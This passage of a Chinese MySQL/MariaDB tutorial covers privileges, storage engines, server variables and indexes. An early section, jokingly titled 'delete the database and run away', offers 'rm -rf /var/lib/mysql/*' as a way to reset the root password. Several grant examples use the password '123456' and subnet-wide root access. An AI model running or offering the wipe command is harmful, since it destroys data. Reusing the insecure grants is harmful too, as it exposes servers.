~]<span class="hljs-comment">#vim /etc/my.cnf</span><br>[mysqld]<br><span class="hljs-comment">#skip-grant-tables                                                               </span><br><span class="hljs-comment">#skip-networking</span><br>[root@centos8 ~]<span class="hljs-comment"># systemctl restart mysqld</span><br>[root@centos8 ~]<span class="hljs-comment"># mysql -uroot -pubuntu</span><br></code></pre></td></tr></table></figure><h4 id="范例：删库跑路之清空root密码方法"><a href="#范例：删库跑路之清空root密码方法" class="headerlink" title="范例：删库跑路之清空root密码方法"></a>范例：删库跑路之清空root密码方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#此方法适用于包安装方式的MySQL或Mariadb</span><br>[root@centos8 ~]<span class="hljs-comment">#systemctl stop mysqld</span><br>[root@centos8 ~]<span class="hljs-comment">#rm -rf /var/lib/mysql/*</span><br>[root@centos8 ~]<span class="hljs-comment">#systemctl start mysqld</span><br></code></pre></td></tr></table></figure><hr><h2 id="14-权限管理和DCL语句"><a href="#14-权限管理和DCL语句" class="headerlink" title="14 权限管理和DCL语句"></a>14 权限管理和DCL语句</h2><h3 id="GRANT-授权"><a href="#GRANT-授权" class="headerlink" title="GRANT 授权"></a>GRANT 授权</h3><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">GRANT priv_type [(column_list)],... ON [object_type] priv_level TO <span class="hljs-string">&#x27;user&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span> <br>[IDENTIFIED BY <span class="hljs-string">&#x27;password&#x27;</span>] [WITH GRANT OPTION];<br>priv_type: ALL [PRIVILEGES]<br>object_type:TABLE | FUNCTION | PROCEDURE<br>priv_level:  *(所有库)  |*.*   | db_name.*  | db_name.tbl_name  | tbl_name(当前库的<br>表)  | db_name.routine_name(指定库的函数,存储过程,触发器)<br>with_option: GRANT OPTION<br>  | MAX_QUERIES_PER_HOUR count<br>  | MAX_UPDATES_PER_HOUR count<br>  | MAX_CONNECTIONS_PER_HOUR count<br>  | MAX_USER_CONNECTIONS count<br></code></pre></td></tr></table></figure></blockquote><p><strong>使用范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">GRANT ALL ON wordpress.* TO wordpress@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> ;<br><br>GRANT SELECT (col1), INSERT (col1,col2) ON mydb.mytbl TO <span class="hljs-string">&#x27;someuser&#x27;</span>@<span class="hljs-string">&#x27;somehost&#x27;</span>;<br><br>GRANT ALL PRIVILEGES ON *.* TO <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>  WITH GRANT OPTION;<br><br><span class="hljs-comment">#创建用户和授权同时执行的方式在MySQL8.0取消了</span><br>GRANT ALL ON wordpress.* TO wordpress@<span class="hljs-string">&#x27;192.168.8.%&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;123456&#x27;</span>;<br>GRANT ALL PRIVILEGES ON *.* TO <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;192.168.8.%&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;123456&#x27;</span> WITH GRANT OPTION;<br></code></pre></td></tr></table></figure><h3 id="REVOKE-取消权限"><a href="#REVOKE-取消权限" class="headerlink" title="REVOKE 取消权限"></a>REVOKE 取消权限</h3><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">REVOKE priv_type [(column_list)] [, priv_type [(column_list)]] ... ON [object_type] priv_level FROM user [, user] ...<br></code></pre></td></tr></table></figure></blockquote><p><strong>使用范例</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">REVOKE DELETE ON *.* FROM <span class="hljs-string">&#x27;testuser&#x27;</span>@<span class="hljs-string">&#x27;172.16.0.%&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="查看指定用户获得的授权"><a href="#查看指定用户获得的授权" class="headerlink" title="查看指定用户获得的授权"></a>查看指定用户获得的授权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Help SHOW GRANTS<br>SHOW GRANTS FOR <span class="hljs-string">&#x27;user&#x27;</span>@<span class="hljs-string">&#x27;host&#x27;</span>; <br>SHOW GRANTS FOR CURRENT_USER[()];<br></code></pre></td></tr></table></figure><blockquote><p><strong>注意</strong>：</p><p>MariaDB服务进程启动时会读取mysql库中所有授权表至内存</p><p>(1) GRANT或REVOKE等执行权限操作会保存于系统表中，MariaDB的服务进程通常会自动重读授权表，使之生效</p><p>(2) 对于不能够或不能及时重读授权表的命令，可手动让MariaDB的服务进程重读授权表：</p><p>mysql&gt; FLUSH PRIVILEGES;</p></blockquote><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1><hr><h1 id="四、MySQL-架构和性能优化"><a href="#四、MySQL-架构和性能优化" class="headerlink" title="四、MySQL 架构和性能优化"></a>四、MySQL 架构和性能优化</h1><h2 id="1-存储引擎"><a href="#1-存储引擎" class="headerlink" title="1 存储引擎"></a>1 存储引擎</h2><blockquote><p>MySQL中的数据用各种不同的技术存储在文件（或者内存）中。这些技术中的每一种技术都使用不同的存储机制、索引技巧、锁定水平并且最终提供广泛的不同的功能和能力,此种技术称为存储擎,MySQL 支持多种存储引擎其中目前应用最广泛的是<strong>InnoDB和MyISAM两种</strong></p></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221027151700903-1871285651.png"><img src="2927659-20221027151700903-1871285651.png" alt="img"></a></p><h3 id="1-1-MyISAM-存储引擎"><a href="#1-1-MyISAM-存储引擎" class="headerlink" title="1.1 MyISAM 存储引擎"></a>1.1 MyISAM 存储引擎</h3><blockquote><p><strong>MyISAM 引擎特点</strong></p><ul><li><strong>不支持事务</strong></li><li><strong>表级锁定</strong></li><li><strong>读写相互阻塞，写入不能读，读时不能写</strong></li><li><strong>只缓存索引</strong></li><li><strong>不支持外键约束</strong></li><li><strong>不支持聚簇索引</strong></li><li><strong>读取数据较快，占用资源较少</strong></li><li><strong>不支持MVCC（多版本并发控制机制）高并发</strong></li><li><strong>崩溃恢复性较差</strong></li><li><strong>MySQL5.5.5 前默认的数据库引擎</strong></li></ul><p><strong>MyISAM</strong> <strong>存储引擎适用场景</strong></p><ul><li>只读（或者写较少）</li><li>表较小（可以接受长时间进行修复操作）</li></ul><p><strong>MyISAM 引擎文件</strong></p><ul><li><strong>tbl_name.frm 表格式定义</strong></li><li><strong>tbl_name.MYD 数据文件</strong></li><li><strong>tbl_name.MYI 索引文件</strong></li></ul></blockquote><h3 id="1-2-InnoDB-引擎"><a href="#1-2-InnoDB-引擎" class="headerlink" title="1.2 InnoDB 引擎"></a>1.2 InnoDB 引擎</h3><blockquote><p><strong>InnoDB引擎特点</strong></p><ul><li><strong>行级锁</strong></li><li><strong>支持事务，适合处理大量短期事务</strong></li><li><strong>读写阻塞与事务隔离级别相关</strong></li><li><strong>可缓存数据和索引</strong></li><li><strong>支持聚簇索引</strong></li><li><strong>崩溃恢复性更好</strong></li><li><strong>支持MVCC高并发</strong></li><li><strong>从MySQL5.5后支持全文索引</strong></li><li><strong>从MySQL5.5.5开始为默认的数据库引擎</strong></li></ul><p><strong>InnoDB****数据库文件</strong></p><ul><li>所有InnoDB表的数据和索引放置于同一个表空间中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">数据文件：ibdata1, ibdata2,存放在datadir定义的目录下<br>表格式定义：tb_name.frm,存放在datadir定义的每个数据库对应的目录下<br></code></pre></td></tr></table></figure><ul><li><strong>每个表单独使用一个表空间存储表的数据和索引</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">两类文件放在对应每个数据库独立目录中<br>数据文件(存储数据和索引)：tb_name.ibd <br>表格式定义：tb_name.frm<br></code></pre></td></tr></table></figure></blockquote><h3 id="1-3-管理存储引擎"><a href="#1-3-管理存储引擎" class="headerlink" title="1.3 管理存储引擎"></a>1.3 管理存储引擎</h3><h4 id="查看mysql支持的存储引擎"><a href="#查看mysql支持的存储引擎" class="headerlink" title="查看mysql支持的存储引擎"></a>查看mysql支持的存储引擎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show engines;<br></code></pre></td></tr></table></figure><h4 id="查看当前默认的存储引擎"><a href="#查看当前默认的存储引擎" class="headerlink" title="查看当前默认的存储引擎"></a>查看当前默认的存储引擎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show variables like <span class="hljs-string">&#x27;%storage_engine%&#x27;</span>;<br></code></pre></td></tr></table></figure><h4 id="设置默认的存储引擎"><a href="#设置默认的存储引擎" class="headerlink" title="设置默认的存储引擎"></a>设置默认的存储引擎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/my.cnf<br>[mysqld]<br>default_storage_engine= InnoDB<br></code></pre></td></tr></table></figure><h4 id="查看库中所有表使用的存储引擎"><a href="#查看库中所有表使用的存储引擎" class="headerlink" title="查看库中所有表使用的存储引擎"></a>查看库中所有表使用的存储引擎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">show table status from db_name;<br></code></pre></td></tr></table></figure><h4 id="查看库中指定表的存储引擎"><a href="#查看库中指定表的存储引擎" class="headerlink" title="查看库中指定表的存储引擎"></a>查看库中指定表的存储引擎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">show table status like  <span class="hljs-string">&#x27;tb_name&#x27;</span>;<br>show create table tb_name;<br></code></pre></td></tr></table></figure><h4 id="设置表的存储引擎"><a href="#设置表的存储引擎" class="headerlink" title="设置表的存储引擎"></a>设置表的存储引擎</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE TABLE tb_name(... ) ENGINE=InnoDB;<br>ALTER TABLE tb_name ENGINE=InnoDB;<br></code></pre></td></tr></table></figure><hr><h2 id="2-MySQL-中的系统数据库"><a href="#2-MySQL-中的系统数据库" class="headerlink" title="2 MySQL 中的系统数据库"></a>2 MySQL 中的系统数据库</h2><blockquote><ul><li><strong>mysql</strong> <strong>数据库</strong></li></ul><p>    是mysql的核心数据库，类似于Sql Server中的master库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息</p><ul><li><strong>information_schema</strong> <strong>数据库</strong></li></ul><p>    MySQL 5.0之后产生的，一个虚拟数据库，物理上并不存在information_schema数据库类似与”数据字典”，提供了访问数据库元数据的方式，即数据的数据。比如数据库名或表名，列类型，访问权限（更加细化的访问方式）</p><ul><li><strong>performance_schema</strong> <strong>数据库</strong></li></ul><p>    MySQL 5.5开始新增的数据库，主要用于收集数据库服务器性能参数,库里表的存储引擎均为PERFORMANCE_SCHEMA，用户不能创建存储引擎为PERFORMANCE_SCHEMA的表</p><ul><li><strong>sys</strong> <strong>数据库</strong></li></ul><p>    MySQL5.7之后新增加的数据库，库中所有数据源来自performance_schema。目标是把performance_schema的把复杂度降低，让DBA能更好的阅读这个库里的内容。让DBA更快的了解DataBase的运行情况</p></blockquote><hr><h2 id="3-服务器配置和状态"><a href="#3-服务器配置和状态" class="headerlink" title="3 服务器配置和状态"></a>3 服务器配置和状态</h2><blockquote><p>可以通过mysqld选项，服务器系统变量和服务器状态变量进行MySQL的配置和查看状态</p><p><strong>注意</strong>：</p><ul><li>其中有些参数支持运行时修改，会立即生效</li><li>有些参数不支持动态修改，且只能通过修改配置文件，并重启服务器程序生效</li><li>有些参数作用域是全局的，为所有会话设置</li><li>有些可以为每个用户提供单独（会话）的设置</li></ul></blockquote><h3 id="3-1-服务器选项"><a href="#3-1-服务器选项" class="headerlink" title="3.1 服务器选项"></a>3.1 服务器选项</h3><blockquote><p><strong>注意</strong><strong>:</strong> <strong>服务器选项用横线</strong>**,**<strong>不用下划线</strong></p></blockquote><h4 id="获取mysqld的可用选项列表"><a href="#获取mysqld的可用选项列表" class="headerlink" title="获取mysqld的可用选项列表"></a>获取mysqld的可用选项列表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看mysqld可用选项列表和及当前值</span><br>mysqld --verbose --<span class="hljs-built_in">help</span><br><br><span class="hljs-comment">#获取mysqld当前启动选项</span><br>mysqld --print-defaults<br><br><span class="hljs-comment">#查看可用选项列表和当前值</span><br>[root@centos8 ~]<span class="hljs-comment">#/usr/libexec/mysqld --verbose --help</span><br><br><span class="hljs-comment">#查看mysqld的当前启动选项</span><br>[root@centos8 ~]<span class="hljs-comment">#/usr/libexec/mysqld --print-defaults</span><br>/usr/libexec/mysqld would have been started with the following arguments:<br>--plugin-load-add=auth_gssapi.so --datadir=/var/lib/mysql --<br>socket=/var/lib/mysql/mysql.sock --log-error=/var/log/mariadb/mariadb.log --pidfile=/run/mariadb/mariadb.pid<br></code></pre></td></tr></table></figure><h4 id="设置服务器选项方法"><a href="#设置服务器选项方法" class="headerlink" title="设置服务器选项方法"></a>设置服务器选项方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#1.在命令行中设置</span><br>shell&gt; /usr/bin/mysqld_safe --skip-name-resolve=1<br>shell&gt; /usr/libexec/mysqld --basedir=/usr<br><br><span class="hljs-comment">#2.在配置文件my.cnf中设置</span><br>vim /etc/my.cnf<br>[mysqld]<br>skip_name_resolve=1<br>skip-grant-tables<br></code></pre></td></tr></table></figure><h3 id="3-2-服务器系统变量"><a href="#3-2-服务器系统变量" class="headerlink" title="3.2 服务器系统变量"></a>3.2 服务器系统变量</h3><blockquote><p>服务器系统变量：可以分全局和会话两种</p><p><strong>注意</strong><strong>:</strong> <strong>系统变量用下划线</strong>**,**<strong>不用横线</strong></p></blockquote><h4 id="获取系统变量"><a href="#获取系统变量" class="headerlink" title="获取系统变量"></a>获取系统变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#只查看global变量</span><br>SHOW GLOBAL VARIABLES; <br><span class="hljs-comment">#查看所有变量(包括global和session)</span><br>SHOW [SESSION] VARIABLES;<br><br><span class="hljs-comment">#查看指定的系统变量</span><br>SHOW VARIABLES LIKE <span class="hljs-string">&#x27;VAR_NAME&#x27;</span>;<br>SELECT @@VAR_NAME;<br><br><span class="hljs-comment">#查看选项和部分变量</span><br>[root@centos8 ~]<span class="hljs-comment">#mysqladmin variables</span><br></code></pre></td></tr></table></figure><h4 id="修改变量的值"><a href="#修改变量的值" class="headerlink" title="修改变量的值"></a>修改变量的值</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#修改服务器变量的值</span><br><span class="hljs-built_in">help</span> SET<br><br><span class="hljs-comment">#修改全局变量：仅对修改后新创建的会话有效；对已经建立的会话无效</span><br>SET GLOBAL system_var_name=value;<br>SET @@global.system_var_name=value;<br><br><span class="hljs-comment">#修改会话变量</span><br>SET [SESSION] system_var_name=value;<br>SET @@[session.]system_var_name=value;<br></code></pre></td></tr></table></figure><h3 id="3-3-服务器状态变量"><a href="#3-3-服务器状态变量" class="headerlink" title="3.3 服务器状态变量"></a>3.3 服务器状态变量</h3><blockquote><p>服务器状态变量：分全局和会话两种</p><p>状态变量（只读）：用于保存mysqld运行中的统计数据的变量，不可更改</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW GLOBAL STATUS;<br>SHOW [SESSION] STATUS;<br><br><span class="hljs-comment">#范例</span><br>MariaDB [hellodb]&gt; SHOW GLOBAL STATUS like <span class="hljs-string">&#x27;com_select&#x27;</span>;<br>+---------------+-------+<br>| Variable_name | Value |<br>+---------------+-------+<br>| Com_select    | 5     |<br>+---------------+-------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.001 sec)<br></code></pre></td></tr></table></figure><h3 id="3-4-服务器变量-SQL-MODE"><a href="#3-4-服务器变量-SQL-MODE" class="headerlink" title="3.4 服务器变量 SQL_MODE"></a>3.4 服务器变量 SQL_MODE</h3><blockquote><p>SQL_MODE：对其设置可以完成一些约束检查的工作,可分别进行全局的设置或当前会话的设置</p><p><strong>常见****MODE:</strong></p><ul><li>NO_AUTO_CREATE_USER： 禁止GRANT创建密码为空的用户</li><li>NO_ZERO_DATE：在严格模式，不允许使用’0000-00-00’的时间</li><li>ONLY_FULL_GROUP_BY： 对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么将认为这个SQL是不合法的</li><li>NO_BACKSLASH_ESCAPES： 反斜杠”&quot;作为普通字符而非转义字符</li><li>PIPES_AS_CONCAT： 将”||”视为连接操作符而非”或”运算符</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost (none)]&gt; show variables like <span class="hljs-string">&#x27;sql_mode&#x27;</span>;<br>+---------------+-----------------------------------------------------------------------------------------------------------------------+<br>| Variable_name | Value  |<br>+---------------+-----------------------------------------------------------------------------------------------------------------------+<br>| sql_mode      | ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION |<br>+---------------+-----------------------------------------------------------------------------------------------------------------------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br></code></pre></td></tr></table></figure><hr><h2 id="4-INDEX-索引"><a href="#4-INDEX-索引" class="headerlink" title="4 INDEX 索引"></a>4 INDEX 索引</h2><h3 id="4-1-索引介绍"><a href="#4-1-索引介绍" class="headerlink" title="4.1 索引介绍"></a>4.1 索引介绍</h3><blockquote><p>索引：是排序的快速查找的特殊数据结构，定义作为查找条件的字段上，又称为键key，索引通过存储引擎实现</p><p><strong>优点：</strong></p><ul><li>索引可以降低服务需要扫描的数据量，减少了IO次数</li><li>索引可以帮助服务器避免排序和使用临时表</li><li>索引可以帮助将随机I/O转为顺序 I/O</li></ul><p><strong>缺点：</strong></p><ul><li>占用额外空间，影响插入速度</li></ul><p><strong>索引类型：</strong></p><ul><li>B+ TREE、HASH、R TREE、FULL TEXT</li><li>聚簇（集）索引、非聚簇索引：数据和索引是否存储在一起</li><li>主键索引、二级（辅助）索引</li><li>稠密索引、稀疏索引：是否索引了每一个数据项</li><li>简单索引、组合索引: 是否是多个字段的索引</li><li>左前缀索引：取前面的字符做索引</li><li>覆盖索引：从索引中即可取出要查询的数据，性能高</li></ul></blockquote><h3 id="4-2-索引结构"><a href="#4-2-索引结构" class="headerlink" title="4.2 索引结构"></a>4.2 索引结构</h3><h4 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221028155910039-1167769648.png"><img src="2927659-20221028155910039-1167769648.png" alt="img"></a></p><h4 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h4><blockquote><ul><li>根节点是黑色的, 叶节点是不存储数据的黑色空节点,图中叶节点为正方形的黑色节点</li><li>任何相邻的两个节点不能同时为红色,红色节点被黑色节点隔开,红色节点的子节点是黑色的</li><li>任意节点到其可到达的叶节点间包含相同数量的黑色节点,保证任何路径相差不会超出2倍,从而实现基本平衡</li></ul></blockquote><p><strong><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221028155943963-1488506353.png"><img src="2927659-20221028155943963-1488506353.png" alt="img"></a></strong></p><h4 id="B-Tree索引"><a href="#B-Tree索引" class="headerlink" title="B-Tree索引"></a>B-Tree索引</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221029141333403-1330195887.png"><img src="2927659-20221029141333403-1330195887.png" alt="img"></a></p><h4 id="B-Tree索引-1"><a href="#B-Tree索引-1" class="headerlink" title="B+Tree索引"></a>B+Tree索引</h4><blockquote><p>B+Tree索引：按顺序存储，每一个叶子节点到根结点的距离是相同的；左前缀索引，适合查询范围类的数据</p><p><strong>可以使用<strong><strong>B+Tree</strong></strong>索引的查询类型：</strong>(假设前提: 姓,名,年龄三个字段建立了一个复合索引)</p><ul><li>全值匹配：精确所有索引列，如：姓wang，名xiaochun，年龄30</li><li>匹配最左前缀：即只使用索引的第一列，如：姓wang</li><li>匹配列前缀：只匹配一列值开头部分，如：姓以w开头的记录</li><li>匹配范围值：如：姓ma和姓wang之间</li><li>精确匹配某一列并范围匹配另一列：如：姓wang,名以x开头的记录</li><li>只访问索引的查询</li></ul><p><strong>B+Tree****索引的限制：</strong></p><ul><li>如不从最左列开始，则无法使用索引，如：查找名为xiaochun，或姓为g结尾</li><li>不能跳过索引中的列：如：查找姓wang，年龄30的，只能使用索引第一列</li></ul><p><strong>特别提示：</strong></p><ul><li>索引列的顺序和查询语句的写法应相匹配，才能更好的利用索引</li><li>为优化性能，可能需要针对相同的列但顺序不同创建不同的索引来满足不同类型的查询需求</li></ul></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221029141835265-924928128.png"><img src="2927659-20221029141835265-924928128.png" alt="img"></a></p><h5 id="面试题-InnoDB中一颗的B-树可以存放多少行数据"><a href="#面试题-InnoDB中一颗的B-树可以存放多少行数据" class="headerlink" title="面试题: InnoDB中一颗的B+树可以存放多少行数据"></a>面试题: InnoDB中一颗的B+树可以存放多少行数据</h5><blockquote><p>假设定义一颗B+树高度为2，即一个根节点和若干叶子节点。那么这棵B+树的存放总行记录数=根节点指针数<em>单个叶子记录的行数。这里先计算叶子节点，B+树中的单个叶子节点的大小为16K，假设每一条目为1K，那么记录数即为16(16k/1K=16)，然后计算非叶子节点能够存放多少个指针，假设主键ID为bigint类型，那么长度为8字节，而指针大小在InnoDB中是设置为6个字节，这样加起来一共是14个字节。那么通过页大小/(主键ID大小+指针大小），即16384/14=1170个指针，所以一颗高度为2的B+树能存放16</em>1170=18720条这样的记录。根据这个原理就可以算出一颗高度为3的B+树可以存放16<em>1170</em>1170=21902400条记录。所以在InnoDB中B+树高度一般为2-3层，它就能满足千万级的数据存储</p></blockquote><h3 id="4-3-索引优化"><a href="#4-3-索引优化" class="headerlink" title="4.3 索引优化"></a>4.3 索引优化</h3><blockquote><ul><li>独立地使用列：尽量避免其参与运算，独立的列指索引列不能是表达式的一部分，也不能是函数的参数，在where条件中，始终将索引列单独放在比较符号的一侧，尽量不要在列上进行运算（函数操作和表达式操作）</li><li>左前缀索引：构建指定索引字段的左侧的字符数，要通过索引选择性（不重复的索引值和数据表的记录总数的比值）来评估，尽量使用短索引，如果可以，应该制定一个前缀长度</li><li>多列索引：AND操作时更适合使用多列索引，而非为每个列创建单独的索引</li><li>选择合适的索引列顺序：无排序和分组时，将选择性最高放左侧</li><li>只要列中含有NULL值，就最好不要在此列设置索引，复合索引如果有NULL值，此列在使用时也不会使用索引</li><li>对于经常在where子句使用的列，最好设置索引</li><li>对于有多个列where或者order by子句，应该建立复合索引</li><li>对于like语句，以 % 或者 _ 开头的不会使用索引，以 % 结尾会使用索引</li><li>尽量不要使用not in和&lt;&gt;操作,虽然可能使用索引,但性能不高</li><li>不要使用RLIKE正则表达式会导致索引失效</li><li>查询时，能不要<em>就不用</em>，尽量写全字段名，比如:select id,name,age from students;</li><li>大部分情况连接效率远大于子查询</li><li>在有大量记录的表分页时使用limit</li><li>对于经常使用的查询，可以开启查询缓存</li><li>多使用explain和profile分析查询语句</li><li>查看慢查询日志，找出执行时间长的sql语句优化</li></ul></blockquote><h3 id="4-4-管理索引"><a href="#4-4-管理索引" class="headerlink" title="4.4 管理索引"></a>4.4 管理索引</h3><h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">CREATE [UNIQUE] INDEX index_name ON tbl_name (index_col_name[(length)],...);<br>ALTER TABLE tbl_name ADD INDEX index_name(index_col_name[(length)]);<br><span class="hljs-built_in">help</span> CREATE INDEX;<br></code></pre></td></tr></table></figure><h4 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">DROP INDEX index_name ON tbl_name;<br>ALTER TABLE tbl_name DROP INDEX index_name(index_col_name);<br></code></pre></td></tr></table></figure><h4 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SHOW INDEX FROM [db_name.]tbl_name;<br></code></pre></td></tr></table></figure><h4 id="优化表空间"><a href="#优化表空间" class="headerlink" title="优化表空间"></a>优化表空间</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">OPTIMIZE TABLE tb_name;<br></code></pre></td></tr></table></figure><h4 id="查看索引的使用"><a href="#查看索引的使用" class="headerlink" title="查看索引的使用"></a>查看索引的使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">SET GLOBAL userstat=1;  <span class="hljs-comment">#MySQL无此变量</span><br>SHOW INDEX_STATISTICS;<br></code></pre></td></tr></table></figure><h5 id="范例：创建索引和使用索引"><a href="#范例：创建索引和使用索引" class="headerlink" title="范例：创建索引和使用索引"></a>范例：创建索引和使用索引</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">MariaDB [hellodb]&gt; create index idx_name on students(name(10));<br>Query OK, 0 rows affected (0.009 sec)<br>Records: 0 Duplicates: 0  Warnings: 0<br>MariaDB [hellodb]&gt; show indexes from students\G<br>*************************** 1. row ***************************<br>        Table: students<br>   Non_unique: 0<br>     Key_name: PRIMARY<br> Seq_in_index: 1<br> Column_name: StuID<br>    Collation: A<br> Cardinality: 25<br>     Sub_part: NULL<br>       Packed: NULL<br>         Null: <br>   Index_type: 